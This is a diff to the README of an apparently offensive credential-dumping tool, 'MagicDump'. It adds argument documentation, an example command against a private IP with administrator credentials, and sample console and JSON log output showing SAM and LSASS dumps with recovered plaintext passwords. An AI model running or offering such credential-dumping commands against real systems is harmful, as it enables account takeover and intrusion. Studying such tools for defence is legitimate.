@@ -62,6 +62,13 @@ Run the script with the required options:
 
 <br>
 
+### Arguments
+- `-t`: specify the target IP address
+- `-u`: specify the username to authenticate as
+- `-p`: specify the password
+
+<br>
+
 For help:
 ```bash
 ./MagicDump -h
@@ -75,18 +82,78 @@ For help:
 
 ## Example
 ```bash
-./MagicDump -t 192.168.1.100 -u admin -p password123
+./MagicDump -t 192.168.1.100 -u Administrator -p SuperSecretPass123
 ```
 
 <br>
 
 Output:
-```
+```bash
+[INFO] Starting MagicDump against target 192.168.1.100
+[INFO] Authenticating as user 'Administrator'...
 [INFO] Connecting to target 192.168.1.100 via SMB...
 [LOG] Operation: SAM, Status: success
-[INFO] SAM dump saved to /home/user/.magicdump/dumps/SAM_dumped_192.168.1.100.txt
+[INFO] SAM dump saved to /home/pascal/.magicdump/dumps/SAM_dumped_192.168.1.100.txt
 [LOG] Operation: LSASS, Status: success
 [INFO] LSASS dumped and decrypted successfully
+[CREDENTIALS FOUND]:
+Administrator: SuperSecretPass123
+User1: Passw0rd!
+[LOG] Operation: NTDS, Status: failed
+[WARNING] Failed to dump NTDS: Access denied
+[INFO] Dumping complete. Logs saved to /home/pascal/.magicdump/logs/report_192.168.1.100_20250104135344.json.
+```
+
+<br>
+
+---
+
+## Logfile example
+
+```json
+{
+  "target_host": "192.168.1.100",
+  "operation_time": "2025-01-04T13:53:44Z",
+  "credentials_dumped": {
+    "SAM": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/SAM_dump_192.168.1.100.txt"
+    },
+    "LSASS": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/LSASS_dump_192.168.1.100.dmp",
+      "decrypted_credentials": [
+        {
+          "username": "Administrator",
+          "password": "SuperSecretPass123"
+        },
+        {
+          "username": "User1",
+          "password": "Passw0rd!"
+        }
+      ]
+    },
+    "NTDS": {
+      "status": "failed",
+      "error": "Access denied"
+    }
+  },
+  "warnings": [
+    "Failed to dump NTDS: Access denied"
+  ],
+  "logs": [
+    "Starting MagicDump against target 192.168.1.100",
+    "Authenticating as user 'Administrator'...",
+    "Connecting to target 192.168.1.100 via SMB...",
+    "Operation: SAM, Status: success",
+    "SAM dump saved to /home/pascal/.magicdump/dumps/SAM_dump_192.168.1.100.txt",
+    "Operation: LSASS, Status: success",
+    "LSASS dumped and decrypted successfully",
+    "Operation: NTDS, Status: failed",
+    "Failed to dump NTDS: Access denied",
+    "Dumping complete. Logs saved to /home/pascal/.magicdump/logs/report_192.168.1.100_20250104135344.json."
+  ]
+}
 ```
 
 <br>
